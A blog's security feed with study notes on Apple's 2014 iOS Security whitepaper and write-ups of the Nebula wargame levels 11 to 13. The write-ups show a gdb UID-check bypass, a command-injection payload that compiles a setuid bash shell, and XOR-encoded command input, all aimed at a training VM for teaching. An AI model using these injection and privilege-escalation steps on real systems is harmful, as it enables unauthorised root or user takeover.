<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Security | Han]]></title>
  <link href="http://hanjc.me/blog/categories/security/atom.xml" rel="self"/>
  <link href="http://hanjc.me/"/>
  <updated>2014-07-11T23:54:57-07:00</updated>
  <id>http://hanjc.me/</id>
  <author>
    <name><![CDATA[Zealoct]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Notes on iOS Security Whitepaper]]></title>
    <link href="http://hanjc.me/blog/2014/03/03/ios-security/"/>
    <updated>2014-03-03T03:56:09-08:00</updated>
    <id>http://hanjc.me/blog/2014/03/03/ios-security</id>
    <content type="html"><![CDATA[<p>This notes is based on <em>iOS Security &ndash; February 2014</em>, origin link can be found <a href="http://images.apple.com/iphone/business/docs/iOS_Security_Feb14.pdf">here</a>.</p>

<p>This paper gives a brief description of iOS security, including hardware security features and how iOS leverages these features.</p>

<h2>System Security</h2>

<h3>Secure Boot Chain</h3>

<p>ROM is sealed with public key of Apple Root CA, and will verify the Low-Level Bootloader (LLB) before load it.</p>

<p>For devices with an A7 processor, the <em>Secure Enclave</em> coprocessor also utilizes a secure boot process that ensures its separate software is verified and signed by Apple.</p>

<p>Verification failure will enter <strong>recovery mode</strong>, if Boot ROM is not even able to load or verify LLB, it enters <strong>DFU (Device Firmware Update) mode</strong>.</p>

<h3>System Software Authorization</h3>

<p>GOAL: prevent the devices from being downgraded.</p>

<p>Need iTunes to upgrade, when upgrading, iTunes (or the device) would send</p>

<ol>
<li>a list cryptographic measurements of each installation bundle to be installed</li>
<li>nonce</li>
<li>device&rsquo;s unique ID (ECID)</li>
</ol>


<p>to Apple installation authorization server.</p>

<p>If upgrade request is permitted, server would add ECID to the measurement and signs the result.</p>

<p>Device would check each item loaded from disk at boot time.</p>

<!-- more -->


<h3>Secure Enclave</h3>

<p>There are two kinds of processors, <em>application processor (A7)</em> and <em>Secure Enclave</em>.</p>

<p><strong>What is Secure Enclave?</strong>
A coprocessor fabricated in the Apple A7 chip, has its OWN <em>secure boot</em> and <em>personalized software update</em>, <em>encrypted memory</em> and <em>hardware random number generator</em>.</p>

<p><strong>What does Secure Enclave do?</strong>
It provides all cryptographic operations for Data Protection key management and maintains the integrity of Data Protection, it is also responsible for processing fingerprint data, determining if there is a match, and enabling access or purchase on behalf of the user.</p>

<p><strong>How Secure Enclave communicate with app processor?</strong>
Communication is isolated to an interrupt-driven mailbox and shared memory data buffers.</p>

<p>Each Secure Enclave is provisioned during fabrication with its own <em>UID (Unique ID)</em>, not known to Apple, not accessible to other parts of the system. Note that this UID is NOT SAME with that fused into application processor.</p>

<p>Create an ephemeral key tangled with UID to encrypt Secure Enclave&rsquo;s portion of the device&rsquo;s memory space.</p>

<p>Data saved to file system by Secure Enclave is encrypted with a key tangled with UID and an anti-replay counter.</p>

<p>Utilizes System Software Authorization to ensure the integrity of its software and prevent downgrade.</p>

<h4>Some Questions</h4>

<ol>
<li><p>How secure boot of Secure Enclave is achieved?</p></li>
<li><p>Where the ephemeral key is stored? How about the key and anti-replay counter used to encrypt data written to file system by Secure Enclave?</p></li>
</ol>


<h3>Touch ID</h3>

<p>80*80 pixel, 500 ppi <a href="http://en.wikipedia.org/wiki/Raster_scan">raster scan</a>, temporarily stored in Secure Enclave, data out from Touch ID sensor is encrypted, A7 can only forward it to Secure Enclave but never read its content.</p>

<p>User&rsquo;s fingerprint map never leaves ip5s.</p>

<h4>Safe communicate with Secure Enclave</h4>

<p>Touch ID can only talk to Secure Enclave through application processor.  Communication between the A7 and the
Touch ID sensor takes place over a <a href="http://en.wikipedia.org/wiki/Serial_Peripheral_Interface_Bus">serial peripheral interface bus</a>.</p>

<p>There is a <em>device&rsquo;s key</em> that is build into the Touch ID sensor and Secure Enclave (should differ from Enclave&rsquo;s UID and device UID in application processor). To communicate with Enclave, Touch ID first negotiates with Enclave for a session key, which process should be protected by the device&rsquo;s key. Touch ID then sends the encrypted scan result to Enclave.</p>

<blockquote><p>The session key exchange uses AES key wrapping with both sides providing a random key that establishes the session key and uses AES-CCM transport encryption</p></blockquote>

<h4>Process of unlocking an iPhone</h4>

<p>On regular A7 processor, Data Protection <em>class keys</em> are discarded, and regenerated when user unlock the device with passcode.</p>

<p>With Touch ID, the keys are wrapped with a key given to Touch ID subsystem, Touch ID will provide the key for unwrapping if it recognizes the user&rsquo;s fingerprint (details refer to section <em>File Data Protection</em>)</p>

<h3>Simple Conclusion</h3>

<p>The following features are most critical for iOS system security</p>

<ul>
<li>UID in Secure Enclave</li>
<li>dedicated secure CPU</li>
<li>unbreakable ROM</li>
</ul>


<h2>Encryption and Data Protection</h2>

<p>Focus on the protection of data stored on the device.</p>

<h3>Hardware Security Features</h3>

<p>Apple&rsquo;s devices involves some hardware support for security, these includes:</p>

<ul>
<li><p><em>Dedicated hardware AES 256 crypto engine</em> built into DMA path between Flash and Main Memory</p></li>
<li><p><em>Hardware SHA-1</em></p></li>
<li><p><em>Fused UID</em>, in application processor, unique to each device, software and firmware cannot read UID, can only get the results of encryption or decryption operations</p></li>
<li><p><em>Fused GID</em>, common to a class of devices, used as an additional level of protection when delivering system software during installation and restore</p></li>
</ul>


<blockquote><p>Integrating these keys into the silicon helps prevent them from being tampered with or bypassed, or accessed outside the AES engine.</p></blockquote>

<ul>
<li><p>A hardware <em>random number generator (RNG)</em> to create all cryptographic keys (except those used in Secure Enclave)</p></li>
<li><p><em>Effaceable Storage</em> for securely erasing saved keys</p></li>
</ul>


<h3>File Data Protection</h3>

<p>GOAL: Protect data stored in flash memory.</p>

<blockquote><p>Data Protection allows the device to respond to common events such as incoming phone calls, but also enables a high level of encryption for sensitive data</p></blockquote>

<p>Managing a <strong>hierarchy of keys</strong>; built on hardware encryption; encrypted every file stored into the flash.</p>

<blockquote><p>Data Protection is controlled on a per-file basis by assigning each file to a class; accessibility is determined by whether the class keys have been unlocked</p></blockquote>

<p>Create a new 260-bit key (per-file key) for EACH file on the data partition, <em>hardware AES engine</em> uses these keys to encrypt files when written to flash memory using AES CBC mode.</p>

<p>Per-file key is wrapped (by Enclave) with one class key (performed using NIST AES key wrapping, per RFC 3394). The wrapped per-file key is stored in the file’s <em>metadata</em>.</p>

<p>To open a file: <strong>1.</strong> decrypt metadata with <em>File System Key</em> <strong>2.</strong> unwrapped with class key <strong>3.</strong> supply the per-file key to hardware AES engine.</p>

<p>Use a random <em>File System Key</em> to encrypt the metadata of all files in the file system. This file system key is created when iOS first installed or when the device is wiped by a user. The key is stored in Effaceable Storage to be quickly erased.</p>

<p>Once the File System Key is wiped, there should be no way to get the content of all the files.</p>

<p>The work of key management is done by Secure Enclave, as mentioned in section Secure Enclave.</p>

<h3>Passcodes</h3>

<p>Supports <em>four-digit</em> and <em>arbitrary-length alphanumeric</em> passcodes.</p>

<blockquote><p>In addition to unlocking the device, a passcode provides the entropy for encryption keys, which are not stored on the device. This means an attacker in possession of a device can’t get access to data in certain protection classes without the passcode.</p></blockquote>

<p>Passcode is tangled with UID.</p>

<p>Takes longer and longer for brute-force hack.</p>

<p><strong>Where is this Passcodes stored?</strong>
Passcodes should be managed by Secure Enclave, and stored in file system after being encrypted by Secure Enclave.</p>

<h3>Data Protection Classes</h3>

<p>Basic classes:</p>

<ul>
<li>Complete Protection</li>
<li>Protected Unless Open</li>
<li>Protected Until First User Authentication</li>
<li>No Protection</li>
</ul>


<p><em>NSFileProtectionComplete</em> : class key protected with a key derived from Passcode and device UID, auto discard the decrypted class key after the screen is lock. File becomes inaccessible until unlock (either by Passcode or Touch ID).</p>

<p><em>NSFileProtectionCompleteUnlessOpen</em> : for files need to be written while locking. Besides per-file key, Data Protection: <strong>1.</strong> creates another <em>public/private key pair</em> for the file <strong>2.</strong> a shared secret is computed using file&rsquo;s private key and this class&rsquo;s public key <strong>3.</strong> wrap the per-file key with the hash of shared secret <strong>4.</strong> wrapped per-file key and file&rsquo;s public key are stored in the file&rsquo;s metadata <strong>5.</strong> wipe the file&rsquo;s private key from memory <strong>6.</strong> to open the file, the shared secret is re-generated using file&rsquo;s public key and this class&rsquo;s private key, to unwrap per-file key.</p>

<p><em>NSFileProtectionCompleteUntilFirstUserAuthentication</em> : behaves in the same way as Complete Protection, only that decrypted class key is not wiped after lock. This is DEFAULT CLASS for all third-party app data.</p>

<p><em>NSFileProtectionNone</em> : class key protected only with UID (no Passcode), kept in Effaceable Storage. All the keys needed to decrypt files of this class are stored on the device.</p>

<p>So in a short <strong>conslusion</strong>, all the files in iOS devices are encrypted, as there always be a hardware AES between memory and flash, only that stronger protection involves encrypting class key with Passcode, and auto wiping the decrypted key after the device is locked.</p>

<h3>Keychain Data Protection</h3>

<p>GOAL: protect short but sensitive bits of data in apps, such as keys and login tokens.</p>

<p>Implemented as SQLite database, and there is only one database in the system. The <em>securityd</em> deamon determines which keychain items each process or app can access.</p>

<p>The deamon would check app&rsquo;s &ldquo;keychain-access-groups&rdquo; and the &ldquo;application-identifier&rdquo; entitlement. Apps from the same author (have the same access groups prefix allocated to them through the iOS Developer Program) can share Keychain items.</p>

<p>Similar protect class as file Data Protection.</p>

<blockquote><p>Each keychain class has a “This device only” counterpart, which is always protected with the UID when being copied from the device during a backup, rendering it useless if restored to a different device</p></blockquote>

<h3>Keybags</h3>

<p>Manage keys for file and Keychain Data Protection classes, four keybags: <em>System</em>, <em>Backup</em>, <em>Escrow</em>, and <em>iCloud</em>.</p>

<p><strong>System keybag</strong> where wrapped class keys are stored, is No Protection class itself. Contents of system keybag are encrypted with a key held in Effaceable Storage. This key is wiped and regenerated each time user change Passcode. System keybag is the ONLY keybag stored on the device.</p>

<p><strong>Backup keybag</strong> created when an encrypted backup is made by iTunes and stored
on the computer where the device is backed up. The backed-up data is <strong>re-encrypted</strong> to a new set of keys (a new keybag).</p>

<p><strong>Escrow keybag</strong> is used for iTunes syncing and mobile device management (MDM). Allows iTunes to sync without requiring the user to enter a passcode and allows an MDM server to remotely clear a user&rsquo;s passcode. Stored on computer. Contains exactly the SAME class keys used on device, protected by a newly created key, which is stored on the device in Protected Until First User Authentication class.</p>

<p><strong>iCloud Backup keybag</strong> similar to Backup keybag, all class keys in this keybag are asymmetric.</p>

<blockquote><p>For all Data Protection classes except No Protection, the encrypted data is read from the device and sent to iCloud. The corresponding class keys are protected by iCloud keys. The keychain class keys are wrapped with a UID-derived key in the same way as an unencrypted iTunes backup.</p></blockquote>

<h2>App Security</h2>

<p>iOS provides protection to ensure that apps are signed and verified, cannot execute malicious code, and are sandboxed to protect user data at all times.</p>

<h3>App Code Signing</h3>

<p>Mandatory code signing esing Apple-issued certificate. Developers must join iOS Developer Program and provide their real-world indentity for verification.</p>

<h3>Runtime Process Security</h3>

<p>Sandbox. Randomly assigned home directory, can only communicate with APIs.</p>

<p>Majority of iOS and all third-party apps run as the non-privileged user &ldquo;mobile&rdquo;.</p>

<p>Address space layout randomization (ASLR)</p>

<p>ARM&rsquo;s Execute Never (XN) feature, which marks memory pages as non-executable.</p>

<blockquote><p>Memory pages marked as both writable and executable can be used only by apps under tightly controlled conditions: The kernel checks for the presence of the Apple-only dynamic code-signing entitlement.</p></blockquote>

<h3>Data Protection in Apps</h3>

<p>Data Protection is available for file and database APIs, Protected Until First User Authentication by default.</p>

<h3>Accessories</h3>

<p>The following process is entirely handled by a integrated circuit that Apple provides to approved accessory manufacturers and is transparent to the accessory.</p>

<ul>
<li>Check accessory&rsquo;s Apple-provided certificate.</li>
<li>Send a challenge, which the accessory must answer with a signed response.</li>
</ul>


<h2>Network Security </h2>

<p>Uses standard networking protocols for authenticated, authorized, and encrypted communications. Integrates proven technologies and the latest standards for both Wi-Fi and cellular data network connections.</p>

<p>(Refer to the paper for details)</p>

<ul>
<li>SSL (v3), TLS (v1.0, v1.1, v1.2)</li>
<li>VPN, supports multiple protocols and authentication methods</li>
<li>Wi-Fi, industry-standard Wi-Fi protocols</li>
<li>Bluetooth, Encryption Mode &frac34;, Service Level 1 connections, multiple Blutooth profiles</li>
<li>Single Sign-on (I do not know what this SSO is&hellip;)</li>
</ul>


<h3>AirDrop Security</h3>

<p>Use Bluetooth Low-Energy (BTLE) and Apple-created peer-to-peer Wi-Fi technology.</p>

<p>If enabled, a 2048-bit RSA identity is stored on the device, and an AirDrop identity hash is created based on email address and phone number.</p>

<p>Use TLS connection.</p>

<h2>Internet Security</h2>

<p>Explain the security control of iMessage, FaceTime, Siri, iCloud, iCloudKeychain in detail.</p>

<h3>iMessage</h3>

<p>The contents of messages of iMessage are protected by end-to-end encryption, so no one but the sender and receiver can access them, even Apple cannot.</p>

<p>Device generates two pairs of keys for iMessage: an RSA 1280-bit key for encryption and an ECDSA 256-bit key for signing. The private keys are stored in device&rsquo;s keychain while the public keys are sent to Apple&rsquo;s directory service (IDS), where they are associated with user&rsquo;s phone number or email address and Apple Push Notification Service (APNs) address.</p>

<p>To send a message, iMessage first fetches receiver&rsquo;s public keys and APNs addresses from the IDS, then encrypts the content using receiver&rsquo;s public keys, and signs the encrypted messages with the sender&rsquo;s private key, finally, iMessage dispatches each encrypted message to APNs for delivary. Metadata is not encrypted while communication with APNs is encrypted using TLS.</p>

<p>If the message contains attachments, the attachments are uploaded to iCloud after encryption, the keys to decrypt attackments along with URI to the encrypted attachments are included in the encrypted message.</p>

<p>For the receiver, each device receives its copy of the message from APNs, and decrypts the message with its own private key. The message can be verified using sender&rsquo;s public key.</p>

<h2>Device Control</h2>

<p>Policies for Passcode Protection, Configuration Enforcement, Mobile Device Management, Apple Configurator, Device Restrictions, Supervised Only Restrictions and Remote Wipe.</p>

<h2>Conclusion</h2>

<ul>
<li>Hardware support: UID, Secure Enclave, ROM, Hardware AES, Random Number Generator</li>
<li>Dedicated Secure Processor, with encrypted memory</li>
<li>Full Storage Encryption</li>
<li>Hierarchy of Key Management</li>
</ul>


<p>From the document we can see, Apple really takes great efforts in security, and as Apple&rsquo;s hardware and software are tightly combined, they possess the most enviable hardware security features. But to achieve security, Apple sacrifices the ability of third party apps by setting a lot of constrains and providing only a limited APIs.</p>

<p>Oh! One more thing, all of these protections are useless if your device is rooted.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 13]]></title>
    <link href="http://hanjc.me/blog/2014/01/26/nebula-level13/"/>
    <updated>2014-01-26T05:54:12-08:00</updated>
    <id>http://hanjc.me/blog/2014/01/26/nebula-level13</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.</p>

<p>To do this level, log in as the <em>level13</em> account with the password <em>level13</em> . Files for this level can be found in /home/flag13.</p>

<!-- more -->


<h3>Source code</h3>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;string.h></h1>

<h1>define FAKEUID 1000</h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{</p>

<pre><code>int c;
char token[256];

if(getuid() != FAKEUID) {
    printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
    printf("The system administrators will be notified of this violation\n");
    exit(EXIT_FAILURE);
}

// snip, sorry :)

printf("your token is %s\n", token);
</code></pre>

<p>}</p>

<p>```</p>

<h3>Solution</h3>

<p>There is no way for me to be uid 1000, but this executable which contains the token is right here, we cannot be stopped by a simple <code>if</code> branch.</p>

<p>Disassemble the executable <em>flag13</em></p>

<p><code>bash
level13@nebula:~$ objdump -D /home/flag13/flag13 &gt; /home/level13/flag13.asm
</code></p>

<p>Go to the instruction corresponding to the last <em>printf()</em> in the c code, I thought I could read the password out directly from the memory location where <em>token</em> is stored. Turned out that <em>token</em> is calculated with mass of code. Well, as I cannot read the password directly, I could always change the execution flow and let the program print that out.</p>

<p><code>text flag13.asm
080484c4 &lt;main&gt;:
 80484c4:       55                      push   %ebp
 80484c5:       89 e5                   mov    %esp,%ebp
 80484c7:       57                      push   %edi
 80484c8:       53                      push   %ebx
 80484c9:       83 e4 f0                and    $0xfffffff0,%esp
 80484cc:       81 ec 30 01 00 00       sub    $0x130,%esp
 80484d2:       8b 45 0c                mov    0xc(%ebp),%eax
 80484d5:       89 44 24 1c             mov    %eax,0x1c(%esp)
 80484d9:       8b 45 10                mov    0x10(%ebp),%eax
 80484dc:       89 44 24 18             mov    %eax,0x18(%esp)
 80484e0:       65 a1 14 00 00 00       mov    %gs:0x14,%eax
 80484e6:       89 84 24 2c 01 00 00    mov    %eax,0x12c(%esp)
 80484ed:       31 c0                   xor    %eax,%eax
 80484ef:       e8 cc fe ff ff          call   80483c0 &lt;getuid@plt&gt;
 80484f4:       3d e8 03 00 00          cmp    $0x3e8,%eax
 80484f9:       74 36                   je     8048531 &lt;main+0x6d&gt;
 80484fb:       e8 c0 fe ff ff          call   80483c0 &lt;getuid@plt&gt;
 8048500:       ba d0 86 04 08          mov    $0x80486d0,%edx
 8048505:       c7 44 24 08 e8 03 00    movl   $0x3e8,0x8(%esp)
...
</code></p>

<p>This is the snippet of function <em>main()</em>, note that line 16 compare <em>%eax</em> (which is the return value of function call <em>getuid()</em>) with <em>0x3e8</em>, and line 17 will jump to memory location 0x8048531 if they are equal.</p>

<p>In a normal execution, these are apparantly not equal, but we could make it equal with <em>gdb</em>.</p>

<ol>
<li>copy <em>flag13</em> into /home/level13</li>
<li>start it with <em>gdb</em></li>
<li>set a break point at 0x80484f4, which is the instruction to compare</li>
<li>run the program</li>
<li>modify %eax to 1000 at the break point</li>
<li>continue run the program</li>
</ol>


<p>``` bash</p>

<h1>start flag13 with gdb</h1>

<p>level13@nebula:~$ gdb flag13</p>

<h1>set break point and run</h1>

<p>(gdb) b *0x80484f4
Breakpoint 1 at 0x80484f4
(gdb) run
Starting program: /home/level13/flag13</p>

<h1>reach break point, let&rsquo;s take a look at where we are</h1>

<p>Breakpoint 1, 0x080484f4 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x080484e0 &lt;+28>:    mov    %gs:0x14,%eax
   0x080484e6 &lt;+34>:    mov    %eax,0x12c(%esp)
   0x080484ed &lt;+41>:    xor    %eax,%eax
   0x080484ef &lt;+43>:    call   0x80483c0 &lt;getuid@plt>
=> 0x080484f4 &lt;+48>:    cmp    $0x3e8,%eax
   0x080484f9 &lt;+53>:    je     0x8048531 &lt;main+109>
   0x080484fb &lt;+55>:    call   0x80483c0 &lt;getuid@plt></p>

<h1>here we print the registers out, %eax is 1014</h1>

<p>(gdb) i r
eax            0x3f6    1014
ecx            0xbffff804       -1073743868
&hellip;</p>

<h1>change %eax</h1>

<p>(gdb) set $eax=1000
(gdb) i r
eax            0x3e8    1000
ecx            0xbffff804       -1073743868
&hellip;</p>

<h1>continue execution</h1>

<p>(gdb) continue
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 31018) exited with code 063]
```
Now <em>su</em> to <em>flag13</em> with the token.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 12]]></title>
    <link href="http://hanjc.me/blog/2014/01/26/nebula-level12/"/>
    <updated>2014-01-26T04:12:53-08:00</updated>
    <id>http://hanjc.me/blog/2014/01/26/nebula-level12</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>There is a backdoor process listening on port 50001.</p>

<p>To do this level, log in as the <em>level12</em> account with the password <em>level12</em>. Files for this level can be found in /home/flag12.</p>

<!-- more -->


<h3>Source code</h3>

<p>``` lua /home/flag12/flag12.lua
local socketlocal socket = require(&ldquo;socket&rdquo;)
local server = assert(socket.bind(&ldquo;127.0.0.1&rdquo;, 50001))</p>

<p>function hash(password)
  prog = io.popen(&ldquo;echo &rdquo;..password..&ldquo; | sha1sum&rdquo;, &ldquo;r&rdquo;)
  data = prog:read(&ldquo;*all&rdquo;)
  prog:close()</p>

<p>  data = string.sub(data, 1, 40)</p>

<p>  return data
end</p>

<p>while 1 do
  local client = server:accept()
  client:send(&ldquo;Password: &rdquo;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then</p>

<pre><code>print("trying " .. line) -- log from where ;\
local h = hash(line)

if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
  client:send("Better luck next time\n");
else
  client:send("Congrats, your token is 413**CARRIER LOST**\n")
end
</code></pre>

<p>  end</p>

<p>  client:close()
end
```</p>

<h3>Solution</h3>

<p><code>prog = io.popen("echo "..password.." | sha1sum", "r")</code> this line of code in <em>hash()</em> function try to calc the hash of the password, but we can execute any command with a well structed <em>password</em>.</p>

<p>Write a simple Ruby script to send command to server, here I construct a <em>password</em> to make the server build a <em>drop.c</em> file into directory /home/flag12.</p>

<p>``` ruby
require &lsquo;socket&rsquo;</p>

<p>server = TCPSocket.open(&ldquo;127.0.0.1&rdquo;, 50001)
server.puts(&ldquo;hello &amp;&amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;&amp; chmod 777 /home/flag12/flag12 &amp;&amp; chmod +s /home/flag12/flag12 &amp;&amp; echo hello &rdquo;)
ret = server.gets.chomp
puts &ldquo;#{ret}&rdquo;
```</p>

<p>Remenber the piece of C code we used to drop privilege? Here it is again:</p>

<p>``` c /tmp/drop.c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<p>int main() {
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();</p>

<p>  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);</p>

<p>  execv(&ldquo;/bin/bash&rdquo;, NULL);
}
```</p>

<p>Run the Ruby script, I got</p>

<p><code>bash
level12@nebula:~$ ruby client.rb
Password: Better luck next time
</code></p>

<p>It is all right, I have no interest in the password anyway. Take a look at the directory /home/flag12</p>

<p><code>bash
flag12@nebula:~$ ll /home/flag12
total 14
drwxr-x--- 1 flag12 level12   60 2014-03-02 22:45 ./
drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
-rwsrwsrwx 1 flag12 flag12  7322 2014-03-02 22:45 flag12*
-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
</code></p>

<p>Here is the executable <em>flag12</em> with Set-User-ID bit, run it and a bash with <em>flag12</em> user privilege will show up!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit Exercises - Nebula Level 11]]></title>
    <link href="http://hanjc.me/blog/2014/01/26/nebula-level11/"/>
    <updated>2014-01-26T00:44:20-08:00</updated>
    <id>http://hanjc.me/blog/2014/01/26/nebula-level11</id>
    <content type="html"><![CDATA[<h3>About</h3>

<p>The <em>/home/flag11/flag11</em> binary processes standard input and executes a shell command.</p>

<p>There are two ways of completing this level, you may wish to do both :&ndash;)</p>

<p>To do this level, log in as the <em>level11</em> account with the password <em>level11</em> . Files for this level can be found in /home/flag11.</p>

<!-- more -->


<h3>Source code</h3>

<p>``` c</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/mman.h></h1>

<p>/<em>
 * Return a random, non predictable file, and return the file descriptor for it.
 </em>/</p>

<p>int getrand(char **path)
{</p>

<pre><code>char *tmp;
int pid;
int fd;

srandom(time(NULL));

tmp = getenv("TEMP");
pid = getpid();

asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid, 
         'A' + (random() % 26), '0' + (random() % 10), 
         'a' + (random() % 26), 'A' + (random() % 26),
         '0' + (random() % 10), 'a' + (random() % 26));

fd = open(*path, O_CREAT|O_RDWR, 0600);
unlink(*path);
return fd;
</code></pre>

<p>}</p>

<p>void process(char *buffer, int length)
{</p>

<pre><code>unsigned int key;
int i;

key = length &amp; 0xff;

for(i = 0; i &lt; length; i++) {
    buffer[i] ^= key;
    key -= buffer[i];
}

system(buffer);
</code></pre>

<p>}</p>

<h1>define CL &ldquo;Content-Length: &rdquo;</h1>

<p>int main(int argc, char **argv)
{</p>

<pre><code>char line[256];
char buf[1024];
char *mem;
int length;
int fd;
char *path;

if(fgets(line, sizeof(line), stdin) == NULL) {
    errx(1, "reading from stdin");
}

if(strncmp(line, CL, strlen(CL)) != 0) {
    errx(1, "invalid header");
}

length = atoi(line + strlen(CL));

if(length &lt; sizeof(buf)) {
    if(fread(buf, length, 1, stdin) != length) {
        err(1, "fread length");
    }
    process(buf, length);
} else {
    int blue = length;
    int pink;

    fd = getrand(&amp;path);

    while(blue &gt; 0) {
        printf("blue = %d, length = %d, ", blue, length);

        pink = fread(buf, 1, sizeof(buf), stdin);
        printf("pink = %d\n", pink);

        if(pink &lt;= 0) {
            err(1, "fread fail(blue = %d, length = %d)", blue, length);
        }
        write(fd, buf, pink);

        blue -= pink;
    }  

    mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    if(mem == MAP_FAILED) {
        err(1, "mmap");
    }
    process(mem, length);
}
</code></pre>

<p>}</p>

<p>```</p>

<h3>Solution</h3>

<p>In fact I have not passed this one yet, I have met a <strong>problem</strong> which I will talk about later,
right now I just want to explain my <strong>idea</strong>.</p>

<p>The overall function of the program <em>/home/flag11/flag11</em> is to read some inputs, do some modifications to the inputs and then execute what it gets after the modification.</p>

<p>More specifically, <em>flag11</em> requires that the input should match the following pattern:</p>

<pre><code>Content-Length: %d
Content...
</code></pre>

<p>here, depends on the content length <em>%d</em>, <em>flag11</em> will go into two branches, if <code>length &lt; sizeof(buf)</code>,
<em>flag11</em> would read the content directly into <em>buf</em> and pass it to <em>process</em>.
Note that it is required that <code>fread(buf, length, 1, stdin) == length</code>, so we know that <em>length</em> must be 1.
(refer to <a href="http://linux.die.net/man/3/fread">manpage</a> of <em>fread()</em> for details)</p>

<p>Otherwise if <em>length</em> is any number larger or equal to 1024, <em>flag11</em> would buffer the input into a file first,
then pass the content of the file to <em>process</em>. I think these are the TWO WAYS mentioned in the description.</p>

<p>The function <em>process</em> would do some calculation on <em>buf</em> based on its content using XOR operation.
So if we want to executes some commands like <em>/bin/getflag</em>, we need to do some reverse calculation and find out
what the origin <em>buf</em> would be like.</p>

<h4>Way One</h4>

<p>My first thought was that I could make <em>length</em> to be 1, and make a soft link to <em>/bin/getflag</em>, then leverage
<em>flag11</em> to execute this soft link. I first create a file <em>f.txt</em></p>

<p>``` text f.txt
Content-Length: 1
f</p>

<p>```</p>

<p>You can expect that <code>'f' ^ (length&amp;&amp;0xff) == 'g'</code>, where <em>length</em> is 1.
Then I would execute the following</p>

<p>``` bash
level11@nebula:~$ ln -s /bin/getflag /tmp/g
level11@nebula:~$ export PATH=/tmp/:$PATH</p>

<p>level11@nebula:~$ /home/flag11/flag11 &lt; /home/level11/f.txt
sh: gP,: command not found</p>

<p>level11@nebula:/home/flag11$ ./flag11 &lt; /home/level11/f.txt
sh: $&lsquo;g\240\030&rsquo;: command not found
```</p>

<p>Failed. Since each time the output command are different (but the first char <em>g</em> is correct),
it must be that <em>buf</em> actually do not have a string terminator &lsquo;\0&rsquo;,
so I tried a few times and finally</p>

<p><code>bash
level11@nebula:~$ ../flag11/flag11 &lt; ls.txt
getflag is executing on a non-flag account, this doesn't count
</code></p>

<p>Well&hellip;here is the <strong>problem</strong>, the <em>system()</em> call would not drop privilege on my system&hellip;</p>

<p>I read the <a href="http://linux.die.net/man/3/system">manpage</a> of <em>system()</em> carefully, it mentioned that</p>

<blockquote><p>Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the exec(3) family of functions instead, but not execlp(3) or execvp(3). system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian uses a modified bash which does not do this when invoked as sh.)</p></blockquote>

<p>I also did some google and find <a href="http://www.cplusplus.com/forum/articles/11153/">this</a> thread on cplusplus
and <a href="http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges">this</a>
question on Stackoverflow ot be useful. It is said that <em>system()</em> itself would not drop privileges,
but Bash 2 would, and my bash is version 4, so I think this meybe the reason.</p>

<p>I came across an interesting solution for this routine by <a href="http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html">Reno Robert</a>, who leveraged <em>LD_PRELOAD</em> to initialize the buffer.</p>

<h4>Way Two</h4>

<p>Anyway, before I realized this problem, I did do something through the second way,
to get what the input should be from the output command, I wrote another program <em>gen.c</em>:</p>

<p>``` c gen.c
void process(char *buffer, int length)
{</p>

<pre><code>    unsigned int key;
    int i;

    key = length &amp; 0xff;

    for(i = 0; i &lt; length; i++) {
            buffer[i] ^= key;
            key -= (key ^ buffer[i]);
    }
    //system(buffer);
</code></pre>

<p>}</p>

<p>main() {
  char<em> cmd = &ldquo;getflag&rdquo;;
  char buf[1024];
  int len = strlen(cmd);
  memset((void </em>)buf, 0, 1024>>2);
  strncpy(buf, cmd, len+1);</p>

<p>  process(buf, 1024);
  printf(&ldquo;Content-Length: 1024\n&rdquo;);
  fwrite(buf, 1024, 1, stdout);
}
```</p>

<p>and after compiling into an executable <em>gen</em>, I tried to trigger the exploit like this</p>

<p>``` bash
level11@nebula:~$ ./gen | ../flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn&rsquo;t count</p>

<p>```
